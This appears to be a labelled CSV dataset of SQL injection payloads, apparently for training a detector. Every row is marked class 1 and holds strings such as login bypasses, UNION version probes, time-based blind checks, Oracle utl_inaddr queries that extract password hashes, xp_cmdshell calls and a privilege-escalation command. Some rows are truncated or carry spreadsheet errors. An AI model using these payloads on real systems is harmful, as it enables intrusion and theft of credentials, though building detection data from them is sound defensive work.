index,payload,class
401," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
402," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1
403,||6,1
404,or 1/*,1
405," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1
406,select * from users where id  =  1.%@ or 1  =  1 -- 1,1
407," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1
408," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1
409," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1
410," or 1  =  1 or """"  =  ",1
411," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
412,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1
413," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
414,or 'whatever' in   (  'whatever'  ) ,1
415,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1
416,select * from users where id  =  '1'   or 1  =  1 -- 1',1
417,?,1
418, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1
419," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1
420,"admin""  )   or   (  ""1""  =  ""1""#",1
421," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1
422," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1
423, or '' ',1
424," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1
425,or 1  =  1,1
426," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
427,""" or benchmark  (  10000000,MD5  (  1   )    )   #",1
428,""" or ""x""  =  ""x",1
429,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1
430," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1
431, or 'something' like 'some%',1
432," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
433,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1
434,admin' or '1'  =  '1'--,1
435," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
436," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1
437," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1
438,""";waitfor delay '0:0:__TIME__'--",1
439,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1
440," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1
441," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1
442,’ or ‘1’  =  ’1,1
443," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1
444,admin'or 1  =  1 or ''  =  ',1
445," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1
446," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1
447,exec  (  @s  ) ,1
448," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1
449," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1
450, or 1  =  1,1
451,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1
452," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1
453," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1
454, --,1
455," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1
456," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
457," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1
458,update,1
459, or 1/*,1
460," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1
461,"""   )    )    or pg_sleep  (  __TIME__  )  --",1
462,||'6,1
463," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
464,or   (  EXISTS  ) ,1
465,^',1
466,or 'text'   =   n'text',1
467," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1
468," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1
469," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1
470," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1
471, or 0  =  0 --,1
472," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1
473," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1
474," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1
475," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1
476,password:*/  =  1--,1
477," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1
478," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1
479," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1
480," union   (  select NULL,   (  select @@version   )    )    --",1
481," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1
482," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1
483," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1
484," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1
485," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1
486," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1
487," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1
488," select * from users where id  =  1. union select null,version  (    )   -- 1",1
489," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1
490," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1
491, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1
492,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1
493," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
494," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1
495," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1
496," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1
497," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1
498,UNION SELECT,1
499,asc,1
500," || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1
501,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
502," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1
503,  )   or true--,1
504," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
505," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
506, or userid like '%,1
507," union   (  select NULL, NULL,   (  select @@version   )    )    --",1
508,/,1
509,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1
510,"admin""/*",1
511," select * from users where id  =  1.  union select 1,version  (    )   -- 1",1
512," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1
513," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1
514,"admin"" or ""1""  =  ""1",1
515, union   (  select @@version  )   --,1
516, or ''^',1
517,"""   )    )    or sleep  (  __TIME__  )    =  """,1
518," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1
519," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1
520," select * from users where id  =  1 union select @ _,version  (    )   -- 1",1
521,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1
522,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1
523," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1
524," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1
525,"""hi""""  )   or   (  """"a""""  =  """"a""",1
526,select name from syscolumns where id   =     (  sele ...,1
527," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1
528,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1
529," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1
530, or 2 between 1 and 3,1
531,union all select @@version--,1
532," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
533,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
534,""" or isNULL  (  1/0  )   /*",1
535," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1
536," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1
537," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1
538,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1
539, or 'a'  =  'a,1
540, union all select @@version--,1
541," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1
542,"admin"" or 1  =  1/*",1
543, or   (  EXISTS  ) ,1
544," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1
545,declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1
546," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1
547," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1
548," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1
549," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1
550," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1
551,hi' or 1  =  1 --,1
552, UNION SELECT,1
553,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1
554," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1
555," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1
556," select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1
557,desc,1
558," select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1
559,anything' or 'x'  =  'x,1
560," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1
561,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1
562,0x770061006900740066006F0072002000640065006C00 ...,1
563," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1
564," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",1
565," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1
566," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",1
567,or isNULL  (  1/0  )   /*,1
568,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1
569," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1
570," select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1
571,"admin"" or ""1""  =  ""1""#",1
572,"admin"" or 1  =  1--",1
573, or user like '%,1
574,admin'  )   or '1'  =  '1,1
575,""" or sleep  (  __TIME__  )  #",1
576," select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",1
577," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1
578,select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',1
579, or ''-',1
580," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",1
581,admin'  )   or '1'  =  '1'/*,1
582," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
583," select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1
584,select * from users where id  =  1 <@$ or 1  =  1 -- 1,1
585,x' or 1  =  1 or 'x'  =  'y,1
586," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
587," select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1
588,  )   or   (  'x'  )    =    (  'x,1
589, ( ,1
590," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",1
591," select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1
592," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",1
593," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1
594," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",1
595," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1
596," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1
597, )    )    or sleep  (  __TIME__  )    =  ',1
598,having 1  =  1--,1
599,!,1
600,select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,1
601, group by userid having 1  =  1--,1
602," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",1
603," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",1
604,or 0  =  0 --,1
605, or 0  =  0 #,1
606,or pg_sleep  (  __TIME__  )  --,1
607,or '1'  =  '1'--,1
608," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",1
609," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1
610," select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1
611, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,1
612,sqlvuln,1
613," select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",1
614," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1
615,0x730065006c0065006300740020004000400076006500 ...,1
616," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1
617," select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",1
618,declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,1
619,select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1
620, or ''&',1
621," select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",1
622," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
623," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",1
624," select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1
625,or 'something'   =   'some'+'thing',1
626,#NAME?,1
627,or 1 in   (  select @@version  )  --,1
628,declare @q nvarchar   (  4000  )   select @q   = ,1
629," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",1
630," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
631," select * from users where id  =  1 or ""@  (  "" or 1  =  1 -- 1",1
632," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",1
633," select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",1
634," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
635," select * from users where id  =  1 +1<@ union select version  (    )  ,version  (    )   -- 1",1
636," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",1
637," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",1
638,admin'  )   or   (  '1'  =  '1'#,1
639,or a   =   a,1
640,select * from users where id  =  '1' or !<@ or 1  =  1 -- 1',1
641,declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,1
642,"admin"" #",1
643,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,1
644," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",1
645," select * from users where id  =  1 or @#""  (    =  1 or 1  =  1 -- 1",1
646,select * from users where id  =  1 + \+%$ or 1  =  1 -- 1,1
647, )   or pg_sleep  (  __TIME__  )  --,1
648,PRINT @@variable,1
649," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",1
650,or a  =  a--,1
651, or 'x'  =  'x,1
652," select * from users where id  =  1 or ""1{"" or 1  =  1 -- 1",1
653," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",1
654,select * from users where id  =  1 %  (  \  )   or 1  =  1 -- 1,1
655,""" or """"-""",1
656,%2A%28%7C%28mail%3D%2A%29%29,1
657," select * from users where id  =  1 or ""  (  _"" or 1  =  1 -- 1",1
658, having 1  =  1--,1
659," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
660," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",1
661,"admin""  )   or ""1""  =  ""1""#",1
662,  )   or   (  'a'  =  'a,1
663," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",1
664," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",1
665,"""  )   or   (  ""x""  )    =    (  ""x",1
666,union select,1
667,23 OR 1  =  1,1
668," select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",1
669," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",1
670,select * from users where id  =  1.<@$ or 1  =  1 -- 1,1
671,select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',1
672," select * from users where id  =  1 or "";{"" or 1  =  1 -- 1",1
673, or username like '%,1
674,"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )   ",1
675, or uname like '%,1
676,declare @s varchar  (  200  )   select @s   =   0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
677, or 1 --',1
678," select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1",1
679," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
680," select * from users where id  =  '1' union select +\,@@VERSION -- 1'",1
681," select * from users where id  =  1 or ""  (  ;"" or 1  =  1 -- 1",1
682," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
683,select * from users where id  =  1 %$ . or 1  =  1 -- 1,1
684,"admin""  )   or ""1""  =  ""1""--",1
685,1   )    )    or sleep  (  __TIME__  )  #,1
686,select * from users where id  =  1 +$ . or 1  =  1 -- 1,1
687, (  sqlattempt2  ) ,1
688," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",1
689," select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",1
690," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
691," select * from users where id  =  1 or 1#""@ union select version  (    )  ,version  (    )   -- 1",1
692,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1
693," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",1
694,@var select @var as var into temp end --,1
695," select * from users where id  =  1 +   (  \.  )   union select null,@@VERSION -- 1",1
696, or ''  =  ',1
697," select * from users where id  =  1 or "",&"" or 1  =  1 -- 1",1
698," select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",1
699," select * from users where id  =  '1' union select "";""_,version  (    )   -- 1'",1
700,"""&""",1
701,"""   )    )   ;waitfor delay '0:0:__TIME__'--",1
702,",s",1
703,select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,1
704,select * from users where id  =  1 or \+<\ or 1  =  1 -- 1,1
705," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
706," select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",1
707, UNION ALL SELECT,1
708,select * from users where id  =  1 <@.. or 1  =  1 -- 1,1
709," select * from users where id  =  1 or "";.""  =  1 or 1  =  1 -- 1",1
710," select * from users where id  =  1 or 1#""?  =  1 union select 1,version  (    )   -- 1",1
711," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",1
712," select * from users where id  =  1 or "";&"" or 1  =  1 -- 1",1
713,select * from users where id  =  '1' or \<1 or 1  =  1 -- 1',1
714," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",1
715,t'exec master..xp_cmdshell 'nslookup www.googl ...,1
716,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
717, union select,1
718," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",1
719,select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',1
720,or,1
721,select,1
722,""" or 1  =  1--",1
723,a' or 'a'   =   'a,1
724," select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",1
725," select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",1
726,"admin""  )   or   (  ""1""  =  ""1""/*",1
727," select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",1
728," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",1
729," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
730, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,1
731," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",1
732," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
733," select * from users where id  =  1 or "".#"" or 1  =  1 -- 1",1
734," union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",1
735, )   or   (  'x'  =  'x,1
736," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",1
737,or 1  =  1 /*,1
738," select * from users where id  =  1 or ""@#"" or 1  =  1 -- 1",1
739, or 3  =  3,1
740,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
741, or 1  =  1 --,1
742," select * from users where id  =  1 union select 1<@.,version  (    )   -- 1",1
743," select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",1
744," select * from users where id  =  1 or $+<\ union select 1,@@VERSION -- 1",1
745," select * from users where id  =  1 or ""%1"" or 1  =  1 -- 1",1
746,"admin""  )   or ""1""  =  ""1""/*",1
747, or 'text' > 't',1
748,""" or ""a""  =  ""a",1
749," select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1",1
750,"benchmark  (  10000000,MD5  (  1   )    )   #",1
751,exec xp,1
752," select * from users where id  =  1 or \.<\ union select 1,@@VERSION -- 1",1
753," select * from users where id  =  1 or @#""{  =  1 or 1  =  1 -- 1",1
754,hi' or 'a'  =  'a,1
755, or ''*',1
756,sqlattempt1,1
757,admin' or 1  =  1--,1
758," select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1",1
759,1' or '1'  =  '1,1
760," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
761,",@variable",1
762,%2A%7C,1
763," select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1
764,*  (  |  (  mail  =  *   )    ) ,1
765,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",1
766," select * from users where id  =  1 or 1#"", union select 1,version  (    )   -- 1",1
767," select * from users where id  =  1 or 1#""1 union select version  (    )  ,version  (    )   -- 1",1
768, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,1
769," select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",1
770,order by,1
771,select * from users where id  =  1 or !<@ or 1  =  1 -- 1,1
772, or username is not NULL or username   =   ',1
773,admin' or '1'  =  '1'/*,1
774,//*,1
775," select * from users where id  =  1 or   (  \+  )    =  1 union select 1,@@VERSION -- 1",1
776," select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",1
777," select * from users where id  =  1 or "";  )  ""  =  1 or 1  =  1 -- 1",1
778," select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",1
779,"<>""'%;  )    (  &+",1
780, and 1  =  0  )   union all,1
781, or a  =  a--,1
782,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1
783," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",1
